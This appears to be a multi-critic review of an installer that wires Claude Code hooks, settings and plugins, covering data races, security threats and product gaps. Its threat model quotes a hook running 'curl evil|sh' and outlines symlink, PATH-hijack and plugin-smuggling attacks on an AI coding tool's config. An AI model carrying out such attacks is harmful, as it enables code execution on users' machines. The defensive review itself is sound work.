---

### critic-database (data integrity)

## Data integrity

- **User-scope `CLAUDE.md` is NOT a managed-block — it's a naive substring guard + bare append, contradicting the plan.** The plan claims the "CLAUDE.md registration block is the same idea in markdown (`install.py:171-172`)" and "prior CLAUDE.md registration [is] never clobbered (`install.py:171-172`)" — but `install.py:171` gates on `if "dummyindex" in content` (any occurrence of the literal string anywhere — a code fence, a path, an unrelated note) and otherwise does `content.rstrip() + _SKILL_REGISTRATION` (`install.py:174-175`). This is **not** idempotent in the marker sense: it is non-reentrant (a file mentioning "dummyindex" for any reason is silently skipped → registration never lands) and non-updatable (the appended block is never refreshed on upgrade because the substring already matches). It also has no begin/end markers, so uninstall cannot ever remove it. Contrast the real managed block `bootstrap_claude_md` (`output/bootstrap.py:38-72`) which uses `BEGIN_MARKER`/`END_MARKER`, replaces in place, and raises `UnbalancedMarkersError` on duplicates. Code wins — flag the plan's `install.py:171-172` citation as a doc/code conflict (medium-confidence plan prose overstating the guarantee).

- **Two in-process writers + one external CLI writer race on the same `.claude/settings.json` via a shared `.tmp` path.** `_wire_default_plugins_step` runs `wire_default_plugins` (in-process read-merge-write of `enabledPlugins`, `default_plugins.py:158-167` → `enable_plugin` → `write_settings`) and then `install_default_plugins` (`install.py:379`), which shells out to `claude plugin install ... --scope project` (`default_plugins.py:275-278`) — and the `claude` CLI writes the **same** project `settings.json`. The in-process `write_settings` did its read-merge-write before the CLI ran, so any key the CLI adds (or the marketplace-add step writes) is on a stale base relative to nothing here, but the reverse ordering on a *repeat* run, or a concurrent SessionStart hook, is a lost-update window: read-merge-write is not atomic across processes, only the final `tmp.replace` is. No file lock guards `enabledPlugins` vs. the CLI's own merge. Low-probability but it can silently drop a just-written key.

- **`write_settings` uses a fixed `<suffix>.tmp` sidecar — no uniqueness, so concurrent settings writers clobber each other's temp file.** `write_settings` (`claude_settings.py:174-178`) writes `settings_path.with_suffix(".json.tmp")` then `tmp.replace`. Hooks (`hooks.py` → `install_hook_entry` → `write_settings`) and plugins (`enable_plugin` → `write_settings`) target the **same** `settings.json` and therefore the **same** `settings.json.tmp`. Auto-init calls them sequentially (`install.py:275-276`) so single-run is safe, but two `dummyindex` processes (or a SessionStart hook firing mid-install) interleave on one tmp path → a half-written tmp can be `replace`d into place. The data-access convention mandates atomic tmp+replace (`conventions/data-access.md:5-7`) but does not address a *shared* tmp name; this writer is below the canonical `write_text_atomic` and reimplements its own (no `os.getpid()`/`mkstemp` uniqueness).

- **Parse-failure handling is correct and consistent: refuse, never corrupt.** `load_settings` raises `MalformedSettingsError` on invalid JSON or non-object top level (`claude_settings.py:46-60`); every write path goes through it first, so an unparseable `settings.json` is left byte-for-byte intact. `wire_default_plugins` (`default_plugins.py:164-166`), `hooks.install` (`hooks.py:393-394`), `_scrub_legacy_claude_hooks` (`hooks.py:422-424`), and `uninstall` (`hooks.py:486-490`) each catch it and record an error rather than overwrite. `_already_decided` treats a malformed file as "no decision" (`default_plugins.py:129-130`) — correct (it never *writes* on that path). No silent-corruption path found here.

- **Managed-hook idempotency is sound, including the co-located-user-hook merge.** `install_hook_entry` matches our entry by `SENTINEL in command` and refreshes the body *per-hook* (canonical hooks first, user hooks appended, `claude_settings.py:91-108`), explicitly avoiding the v0.25.0 wholesale-replace bug that dropped a user hook co-located in our entry. `remove_hook_entries`/uninstall mirror it (strip only sentinel hooks, keep the entry if a user hook survives, `claude_settings.py:142-163`; `hooks.py:494-508`). User-authored hooks (no sentinel) are never touched (`hooks.py:339`). The `install` refreshed-vs-skipped classification compares on-disk bytes before/after (`hooks.py:382-392`) rather than against canonical body, so it reports honestly once a user co-locates a hook. No concern.

- **`DEFAULT_PLUGINS` dedup is structural, not runtime — a duplicated tuple entry would be written twice with no guard.** Dedup against the repo's prior decision is handled (`_already_decided`, `default_plugins.py:115-133`) and `enable_plugin` is a dict-keyed no-op when already `true` (`claude_plugins.py:148-150`), so the same `target` enabled twice in one run collapses naturally on the dict key. But the iteration over `DEFAULT_PLUGINS` (`default_plugins.py:154`, `:317`) does **not** dedup the tuple itself — two `DefaultPlugin` rows with the same `.target` would each be attempted (the second a harmless `enable_plugin` no-op, but it would still be double-counted into `enabled`/`installed` result tuples and double-printed). Today the tuple is a single entry (`default_plugins.py:60-62`) so this is latent only; flag it as a guard to add when the "one-line edit" to add a default lands, since `PluginWireResult.enabled` is a plain `tuple` with no set semantics.

- **Partial-install consistency: declaration and materialisation can diverge, by design, but the bool collapse hides hook failure.** The declaration (`enabledPlugins` write) and materialisation (`claude plugin install`) are deliberately split (`default_plugins.py:175-189`) so a deferred/failed CLI install still leaves a valid declaration — acceptable. Separately, `_install_project_hooks` returns `True` unconditionally even on a hook exception or recorded `errors` (`install.py:314,323`), so `_auto_init_project`'s return collapses to "build ran" regardless of hook/plugin outcome (also called out in plan Open-questions, `plan.md:127-129`). Consequence: a partial init (index built, hooks failed, settings unwritable) is indistinguishable from a clean one at the return-value boundary — callers must read stderr, not the bool. No data corruption, but the success signal over-reports.

#### Deep first pass — current source

## Data integrity

There is no relational database in this feature. Its durable state is the
filesystem-backed `.context/config.json` intent ledger and Claude project JSON,
plus external Claude CLI materialisation.

- **High — concurrent config reconcilers can silently lose intent updates.** Both reconciliation helpers read a complete immutable `Config`, derive an appended `wired` tuple, and write the whole document (`dummyindex/context/domains/config.py:567-619`, `dummyindex/context/domains/config.py:622-659`). `write_config` uses the single fixed `config.json.tmp` path and an unguarded replace, with no lock or compare-and-swap (`dummyindex/context/domains/config.py:662-682`). The installer sequences those operations inside one process (`dummyindex/installer/install.py:634-643`), but two install/ingest processes can read the same baseline and commit different ledgers; the last whole-document replacement wins, while the shared temporary path can also be replaced or removed underneath the other writer. Use a unique same-directory temporary file for safe replacement and serialize the full read-modify-write transaction (or reject/retry when the source revision changed).

- **High — project settings merges have the same last-writer-wins race, including with the external Claude CLI.** Hook, marketplace, and plugin operations load the entire JSON object, mutate it in memory, and rewrite it (`dummyindex/context/claude_settings.py:64-112`, `dummyindex/context/claude_plugins.py:105-124`, `dummyindex/context/claude_plugins.py:142-155`). Their common writer again uses one fixed `.json.tmp` sidecar without a lock or revision check (`dummyindex/context/claude_settings.py:175-179`). The default-plugin transaction then invokes project-scoped Claude marketplace/install commands that are documented to target the same project settings (`dummyindex/context/default_plugins.py:613-642`) after in-process declaration (`dummyindex/installer/install.py:651-659`). Concurrent dummyindex runs, hook refreshes, or CLI settings changes can therefore drop unrelated keys even though each individual `replace` is atomic. Protect the complete load/merge/write cycle with a cross-process lock or optimistic revision check; a unique temp file alone fixes collision, not stale-snapshot loss.

- **Medium — the persisted `wired` ledger does not enforce unique target identity.** `Config.__post_init__` validates scope and the tri-state flag but not duplicate `wired` targets (`dummyindex/context/domains/config.py:160-192`), and `_parse_wired` accepts every individually valid entry without a uniqueness pass (`dummyindex/context/domains/config.py:356-375`). Reconciliation prevents only newly appended duplicates via a transient target set (`dummyindex/context/domains/config.py:606-618`, `dummyindex/context/domains/config.py:641-658`), so pre-existing duplicate or contradictory records survive indefinitely. Declaration iterates every record (`dummyindex/context/default_plugins.py:487-524`) while materialisation collapses plugin targets to a set (`dummyindex/context/default_plugins.py:670-676`), which can produce inconsistent classifications/reporting for the same identity. Reject duplicate targets on parse, or normalize them with an explicit deterministic precedence and migration.

---

### critic-security (adversarial)

## Security

- **THREAT 1 — Substring sentinel recognition launders attacker hook commands through a trusted upgrade.** Managed entries are selected by the bare substring `SENTINEL in (h.get("command") or "")` (`claude_settings.py:93,98,145`) where `SENTINEL = "DUMMYINDEX_AUTO_REFRESH"` is a fixed public literal (`hooks.py:48,54-56`). `$CLAUDE_PROJECT_DIR` is double-quoted in every body (`hooks.py:97-98,123,136,152`), so the path can't break argv — but `install_hook_entry`'s preserve-merge re-emits any co-located non-sentinel hook verbatim (`claude_settings.py:95-103`) with no validation. Attack: a malicious repo ships `.claude/settings.json` with a hook running `curl evil|sh`; on victim `dummyindex install`/upgrade, dummyindex silently rewrites that hook back into settings, Claude Code executes it next SessionStart with full user privileges. Fix: structured managed-key match (e.g. `"_dummyindex": true`) instead of a guessable substring; emit "preserving N user hook(s)" to stderr so re-emitted payloads are visible.

- **THREAT 2 — Plugin materialisation trusts PATH-resolved `claude` and an attacker's pre-seeded `enabledPlugins`.** `default_runner` is safe in form — list argv, default `shell=False`, no interpolation (`default_plugins.py:207-223`), argv built from the frozen `DEFAULT_PLUGINS` (`default_plugins.py:60-62,275-278`). Gaps: (i) every call resolves the bare name `claude` with `cwd=project_root` (`default_plugins.py:246,267,276`) — no absolute path / `shutil.which`, so a hostile repo plus a `.`-on-PATH user gets arbitrary exec at install time; (ii) `_already_decided` treats any pre-committed `enabledPlugins` key as sacrosanct and leaves it untouched (`default_plugins.py:115-133`), and Claude Code's next-session reconcile installs whatever that block declares — a smuggled enable rides a trusted `dummyindex install` undisclosed. Fix: resolve `claude` to an absolute path with sanitised PATH; warn (don't silently `already`) on foreign `enabledPlugins` keys.

- **THREAT 3 — settings.json written world-readable, and the CLAUDE.md substring guard is a poisoning / denial-of-registration primitive.** (a) `write_settings` does `tmp.write_text(...)` then `tmp.replace` (`claude_settings.py:176-178`): the swap is atomic but the tmp inherits the process umask (~`0644`), leaving a file full of auto-executing hooks group/other-readable; on a shared host, contents leak and the fixed-name `settings.json.tmp` is race-able if `.claude/` is group-writable. No `chmod 600`. (b) User-scope registration gates on `if "dummyindex" in content` (`install.py:171`); any line containing `dummyindex` in `~/.claude/CLAUDE.md` permanently suppresses registration (reports "already registered", `install.py:172`), and the markerless append (`install.py:174-175`) can never be detected or removed. Fix: write settings (and tmp) `0o600`; replace the substring guard with the `BEGIN_MARKER`/`END_MARKER` managed block already used by `bootstrap_claude_md` (`output/bootstrap.py:38-72`).

#### Deep first pass — current source

## Security

1. **High — a repository-controlled `.claude` directory symlink redirects plugin-setting writes outside the repository.** `wire_default_plugins` constructs `project_root / ".claude" / "settings.json"` and passes it directly to marketplace and enable mutators without resolving or bounding the target (`dummyindex/context/default_plugins.py:448-524`). Those mutators create the parent, read the resolved file, and replace a sibling temp (`dummyindex/context/claude_plugins.py:105-124`, `dummyindex/context/claude_plugins.py:142-155`; `dummyindex/context/claude_settings.py:175-179`). A clone containing `.claude -> ../victim-config` therefore makes a user-scope `dummyindex install` add marketplaces and `enabledPlugins` to the external settings file; the project-scoped Claude CLI is then invoked from the same redirected repository path. **Load-bearing mitigation today:** malformed JSON and same-name marketplace conflicts fail closed (`dummyindex/context/default_plugins.py:357-406`), but neither check constrains filesystem scope. Installer symlink validation covers the selected skill/command destination (the user's host root during a user-scope install), not the separate auto-init repository integration path (`dummyindex/installer/install.py:81-124`, `dummyindex/installer/install.py:597-665`). Resolve every settings target and require it to remain beneath `project_root`, or operate through no-follow directory descriptors and reject symlinked project integration directories.

2. **High — committed config can silently promote an arbitrary plugin into Claude's executable declaration state.** `WiredEntry.from_dict` accepts any non-empty target and config parsing preserves it (`dummyindex/context/default_plugins.py:62-108`, `dummyindex/context/domains/config.py:214-301`). Installer orchestration then passes the complete repository-controlled `cfg.wired` ledger to `wire_default_plugins` (`dummyindex/installer/install.py:634-659`), which enables every syntactically valid plugin target, even when `_default_for_target` finds no reviewed registry entry (`dummyindex/context/default_plugins.py:487-524`). An attacker can hide `attacker-plugin@attacker-market` in `.context/config.json`; the next install writes it to `enabledPlugins`, and Claude can materialise that declaration on session start when the marketplace is already known or separately committed. **Load-bearing mitigation today:** immediate install-time materialisation intersects the ledger with `DEFAULT_PLUGINS`, so the dummyindex subprocess will not fetch the foreign target (`dummyindex/context/default_plugins.py:645-697`), and false tombstones win. There is no provenance disclosure or approval gate for the declaration itself—trust disclosure covers only reviewed third-party defaults (`dummyindex/context/default_plugins.py:205-223`). Restrict unattended declaration to reviewed targets, or route custom entries through the existing explicit equip approval flow and report them as needs-user.

3. **Medium — the default path executes whichever `claude` binary wins inherited `PATH`.** The availability probe itself runs bare `claude --version`, and marketplace/install calls use the same unresolved executable name (`dummyindex/context/default_plugins.py:602-604`, `dummyindex/context/default_plugins.py:613-642`). `default_runner` changes into the repository and inherits the process environment while invoking list argv (`dummyindex/context/default_plugins.py:565-581`). A malicious repository paired with a launcher, direnv rule, or user environment that places the repository first on `PATH` gets immediate code execution as soon as the default-plugin pass probes availability. **Load-bearing mitigation today:** list argv avoids shell interpolation, the call is timeout-bounded, immediate plugin targets are allowlisted, third-party marketplace refs are full SHAs, and their code-running surfaces are disclosed before mutation (`dummyindex/context/default_plugins.py:149-223`, `dummyindex/installer/install.py:629-632`). None authenticates the executable, so a fake CLI bypasses all marketplace pinning. Resolve an approved absolute Claude CLI path before entering repository context and execute it with a minimal, explicit environment/PATH.

## Stage 3 — critic-product (product surface)

- **Uninstall leaves all init side-effects behind.** `uninstall` (`uninstall.py:12-86`) removes skills/commands/version-stamp but never the hooks, project CLAUDE.md block, or `enabledPlugins` it wrote; it imports nothing from `hooks.uninstall`. After "removal" the SessionStart hook still fires (now pointing at a deleted skill), and the plugin/CLAUDE.md wiring persists. No `--purge` flag; the "skill removed" line implies a clean teardown. Gap: removal is one-directional and silent about it.

- **`--no-superpowers` opt-out is invisible at the point of effect.** The default install enables and `claude`-CLI-materialises the superpowers plugin (`default_plugins.py:317-322`) with one log line (`default_plugins.py:104-105`) and no inline opt-out hint; the only opt-out is `--no-superpowers` (`args.py:25,79-81`) or a persisted config (`resolve_enabled`, `default_plugins.py:82-91`), discoverable only via `install --help`. Gap: a third-party plugin is enabled + downloaded with no prompt and no visible way to decline.

- **Malformed settings.json: non-destructive but reported as success.** Both wiring paths catch `MalformedSettingsError` into `errors` and leave the file intact (`default_plugins.py:164-166`; hooks per §Parse-failure), surfacing only stderr warnings while `_install_project_hooks` returns `True` (`install.py:303-323`) and the footer prints "Done." and exits 0 (`install.py:198-207`). Gap: hook + plugin wiring silently skipped, no aggregate failure summary, no non-zero exit pointing at the malformed file.

- **Opt-out-by-deletion silently reverts on upgrade.** `_already_decided` honours `enabledPlugins.superpowers = false` but treats a *removed* key as "no decision" (`default_plugins.py:115-133`), so a team that pruned the key gets the plugin re-enabled + re-installed on every `dummyindex install` / `/dummyindex-update` (`default_plugins.py:154-167`). Gap: "deleted" vs "never decided" are indistinguishable; only a `false` tombstone makes removal stick — surprising for a "non-destructive" command.

- **`--scope project` into a non-repo registers `/dummyindex` nowhere.** CLAUDE.md registration is `scope == "user"`-only (`install.py:167-181`); the project managed block lands only via git-repo auto-init (`install.py:271-272`). A project-scope install into a non-repo dir leaves the skill present but unregistered in any CLAUDE.md, with no log line saying so. Gap: silent discoverability hole.

### Cross-review notes (operator impact)

- **Sentinel laundering × one-directional uninstall:** §THREAT 1's re-emit of co-located hooks (`claude_settings.py:95-103`) is never undone — `installer/uninstall.py` can't reach `hooks.uninstall`, so a laundered/user hook executes forever after "removal." Structured-key match should ship with wiring uninstall to the hooks teardown.
- **Bare-`claude` PATH resolution on the silent default path:** §THREAT 2's PATH-trust exec (`default_plugins.py:246,267,276`) fires on every default install/upgrade because the superpowers materialisation is silent + opt-out invisible — the exec side-effect is on the non-elected default path. Absolute-path resolution plus surfacing the materialisation step would make it safer and visible.

---

### critic-product (product surface) — deep first pass, current source

## Product surface

- **A first-time Claude user follows the README install command — the reviewed default plugins are not identified on that first-contact surface before installation starts — the user cannot make an informed pre-run opt-out decision there.** The README quickstart names only `dummyindex install --platform claude` (`README.md:12-22`, `README.md:69-93`), and `install --help` describes “default Claude plugins” generically (`dummyindex/installer/args.py:8-30`). The runtime does print the pinned third-party sources, reviewed surfaces, whether they run code, and the one-run opt-out (`dummyindex/context/default_plugins.py:169-223`), but only inside `_wire_default_plugins_step`, after skill copying and project initialization have begun and immediately before config/settings/CLI mutation (`dummyindex/installer/install.py:117-151`, `dummyindex/installer/install.py:597-665`). The detailed CLI guide carries the missing identities and trust details, but the default README/help path does not.

- **A project build, guidance write, hook install, settings merge, or plugin materialisation fails during `dummyindex install` — warnings or “auto-init skipped” are emitted, then the command still prints `Done` and exits successfully — callers cannot distinguish “skill files copied” from “project ready” through the final status or exit code.** `_auto_init_project` returns `False` for import/refresh/build failures but treats guidance, hook, plugin, and equipment failures as best-effort before returning `True` (`dummyindex/installer/install.py:337-465`); plugin failures are warning-only (`dummyindex/installer/install.py:634-665`). The installer prints the same `Done` footer for both outcomes and only explains the skip when the target is not a repository (`dummyindex/installer/install.py:164-193`), while the command dispatcher returns without propagating a structured partial-success result (`dummyindex/__main__.py:270-289`).

- **A user opts out with `--no-default-plugins`, then later reinstalls or updates without remembering the flag — the CLI opt-out applies to one run and an absent persisted value defaults back to enabled — there is no CLI operation that records a durable opt-out or changes one default independently.** The public option explicitly says “for this run” (`dummyindex/installer/args.py:19-29`), and `resolve_enabled` treats a missing config value as enabled (`dummyindex/context/default_plugins.py:281-290`). Durable control exists through manual `.context/config.json` or Claude settings edits in the detailed guide, so the product surface exposes persistence as file-format knowledge rather than an install/config command.

- **A Claude user runs the documented uninstall after auto-init — the skill family and slash-command aliases are removed, while project guidance, executable hooks, and plugin declarations remain — there is no single supported teardown command for the installed project surface.** Uninstall help accurately warns that Claude guidance and hooks stay intact (`dummyindex/installer/args.py:32-46`), and the implementation removes skills/commands but does not invoke hook, project-guidance, or plugin cleanup (`dummyindex/installer/uninstall.py:19-144`). Hooks have a separate public `context hooks uninstall` verb, but `context bootstrap` only writes guidance and exposes no removal verb (`dummyindex/cli/hooks.py:1-90`, `dummyindex/cli/bootstrap.py:1-71`); uninstall output also reports only the first removed path. The result is an uneven teardown path in which hooks can continue running after the owning skill is gone and the remaining managed state must be discovered and handled separately.

---

# critic-database — cross-review

- **Changed:** none; `## Data integrity` remains the three current-source findings. Security and Product exposed no additional storage invariant beyond the existing whole-document config/settings races and duplicate `wired` identity gap (`dummyindex/context/domains/config.py:567-682`, `dummyindex/context/claude_settings.py:64-112`, `dummyindex/context/domains/config.py:160-192`, `dummyindex/context/domains/config.py:356-375`).
- **Upheld:** Security’s out-of-scope `.claude` symlink finding has a direct wrong-target data consequence and corroborates the settings writer boundary, but it remains best owned as a Security finding rather than duplicated in Data integrity (`dummyindex/context/default_plugins.py:448-524`, `dummyindex/context/claude_plugins.py:105-155`). Product’s partial-success finding is also accurate at the command boundary; the underlying declaration/materialisation divergence is intentional durable desired state, including deferred next-session installation, so rollback would violate the current data model and the missing aggregate result remains a Product concern (`dummyindex/context/default_plugins.py:533-546`, `dummyindex/context/default_plugins.py:645-729`).
- **Peer flags:** Security’s arbitrary `config.wired` target is a provenance/authorization problem, not evidence that custom entries are corrupt: equipment reconciliation deliberately appends non-default plugin intent, declaration accepts syntactically valid custom targets, and immediate materialisation still intersects with the reviewed registry (`dummyindex/context/domains/config.py:567-619`, `dummyindex/context/default_plugins.py:424-530`, `dummyindex/context/default_plugins.py:670-697`). Product’s one-run opt-out and retained Claude state on uninstall are explicit lifecycle semantics rather than lost or contradictory records; the absent persistent-control and unified-teardown commands remain valid Product gaps (`dummyindex/context/default_plugins.py:281-290`, `dummyindex/installer/args.py:19-46`, `dummyindex/installer/uninstall.py:19-144`).

---

# critic-security — cross-review

- **Changed:** Data’s fixed-temp collision finding is also a direct symlink-clobber exploit, so it enters Security at rank 1: pre-seeded `.claude/settings.json.tmp` or `.context/config.json.tmp` is followed during `write_text` before being renamed over the real destination (`dummyindex/context/claude_settings.py:175-179`, `dummyindex/context/domains/config.py:662-682`). The former rank-2 arbitrary-`config.wired` declaration is demoted from the top three because custom plugin intent is an explicit data-model capability and immediate install-time materialisation remains restricted to `DEFAULT_PLUGINS` (`dummyindex/context/domains/config.py:567-619`, `dummyindex/context/default_plugins.py:645-697`).
- **Upheld:** the out-of-scope `.claude` symlink and inherited-`PATH` execution paths remain concrete. The first is broadened to include hook installation, which reaches the redirected settings target before plugin wiring (`dummyindex/context/hooks.py:376-430`, `dummyindex/installer/install.py:512-532`); Product’s first-contact finding confirms that the bare-`claude` probe sits on the default path rather than an explicit plugin-install choice (`dummyindex/installer/args.py:8-30`, `dummyindex/installer/install.py:597-665`).
- **Peer flags:** Data’s lost-update races and duplicate `wired` identity remain integrity defects, not separate top-three attacks. Product’s partial-success reporting weakens detection after a hook/settings/plugin security failure, and retained hooks after uninstall prolong exposure, but neither creates a new primitive beyond the ranked path-write and executable-resolution threats (`dummyindex/installer/install.py:164-193`, `dummyindex/installer/uninstall.py:19-144`). The custom-`wired` provenance gap remains security-relevant below the top-three cutoff; a repository can still promote an unreviewed declaration even though dummyindex’s immediate materialiser will not fetch it (`dummyindex/context/default_plugins.py:487-524`, `dummyindex/context/default_plugins.py:670-697`).

---

# critic-product — cross-review

- **Changed:** the first-contact finding now includes Security’s inherited-`PATH` result: runtime trust text identifies reviewed plugin provenance but neither README/help nor that text identifies the bare `claude` executable launched from repository cwd (`dummyindex/installer/args.py:8-30`, `dummyindex/context/default_plugins.py:565-642`, `dummyindex/installer/install.py:597-665`). Data’s whole-document races also add a caller-visible scenario: concurrent install/hook/Claude writers can each appear successful while one silently drops the other’s config or settings keys, with no conflict or final-state check (`dummyindex/context/domains/config.py:567-682`, `dummyindex/context/claude_settings.py:64-112`, `dummyindex/context/claude_settings.py:175-179`, `dummyindex/context/default_plugins.py:613-642`).
- **Upheld:** partial-success reporting remains distinct from the new silent-success race: the former covers caught failures that still end in `Done`, while the latter covers successful but stale replacements (`dummyindex/installer/install.py:164-193`, `dummyindex/installer/install.py:337-465`). The one-run opt-out and incomplete Claude teardown also remain current caller gaps; Security confirms that retained hooks prolong the executable side effect after skill removal (`dummyindex/installer/args.py:19-46`, `dummyindex/installer/uninstall.py:19-144`).
- **Peer flags:** Security’s fixed-temp symlink clobber and out-of-project `.claude` redirect are concrete path-trust exploits and stay Security-owned; their caller consequence is a misleading successful install, already covered by the absence of aggregate/final-state reporting rather than a separate Product bullet. Data’s duplicate `wired` identity can duplicate classifications and output, but it does not outrank the added lost-update scenario because materialisation collapses targets to the reviewed set (`dummyindex/context/default_plugins.py:487-530`, `dummyindex/context/default_plugins.py:670-697`).
